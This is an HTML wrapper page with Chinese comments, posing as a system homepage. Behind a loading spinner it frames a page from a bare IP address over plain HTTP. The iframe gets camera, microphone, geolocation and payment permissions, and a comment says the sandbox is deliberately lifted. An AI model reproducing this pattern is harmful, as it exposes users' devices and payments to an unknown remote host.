<!DOCTYPE html>
<html lang="zh-CN">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <meta http-equiv="X-UA-Compatible" content="ie=edge">
    <title>系统主页</title>
    <style>
        /* 清除默认样式，确保全屏填充 */
        html, body {
            margin: 0;
            padding: 0;
            width: 100%;
            height: 100%;
            overflow: hidden;
            background-color: #f5f7fa;
            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, sans-serif;
        }

        /* 页面容器 */
        .app-container {
            width: 100%;
            height: 100%;
            position: relative;
        }

        /* 网页嵌入框架 */
        .app-iframe {
            width: 100%;
            height: 100%;
            border: none;
            display: block;
            opacity: 0; /* 默认隐藏，加载完成后显示 */
            transition: opacity 0.3s ease;
        }

        /* 加载动画样式 */
        .loading-screen {
            position: absolute;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            background-color: #ffffff;
            display: flex;
            flex-direction: column;
            justify-content: center;
            align-items: center;
            z-index: 9999;
            transition: opacity 0.5s ease, visibility 0.5s;
        }

        .spinner {
            width: 40px;
            height: 40px;
            border: 4px solid #f3f3f3;
            border-top: 4px solid #3498db;
            border-radius: 50%;
            animation: spin 1s linear infinite;
        }

        .loading-text {
            margin-top: 16px;
            font-size: 14px;
            color: #555555;
            letter-spacing: 1px;
        }

        @keyframes spin {
            0% { transform: rotate(0deg); }
            100% { transform: rotate(360deg); }
        }

        .loaded .loading-screen {
            opacity: 0;
            visibility: hidden;
        }

        .loaded .app-iframe {
            opacity: 1;
        }
    </style>
</head>
<body>

    <div class="app-container" id="appContainer">
        <!-- 加载等待界面 -->
        <div class="loading-screen" id="loadingScreen">
            <div class="spinner"></div>
            <div class="loading-text">服务连接中，请稍候...</div>
        </div>
        
        <!-- 核心内容载体（解除沙箱限制，支持所有脚本和跨域操作） -->
        <iframe 
            id="targetFrame"
            class="app-iframe"
            src="http://110.42.136.125/progect/WIICvDHgMWmrWauiTaLJ/index.html" 
            allow="geolocation; microphone; camera; midi; vr; accelerometer; gyroscope; payment"
            sandbox="allow-same-origin allow-scripts allow-popups allow-forms allow-modals allow-downloads"
            allowfullscreen="true">
        </iframe>
    </div>

    <script>
        // 监听加载完成事件，平滑切换显示状态
        const iframe = document.getElementById('targetFrame');
        const container = document.getElementById('appContainer');

        iframe.onload = function() {
            container.classList.add('loaded');
        };

        // 防御超时：如果10秒内未加载完成，强制显示界面（防止白屏）
        setTimeout(function() {
            if (!container.classList.contains('loaded')) {
                container.classList.add('loaded');
            }
        }, 10000);
    </script>
</body>
</html>
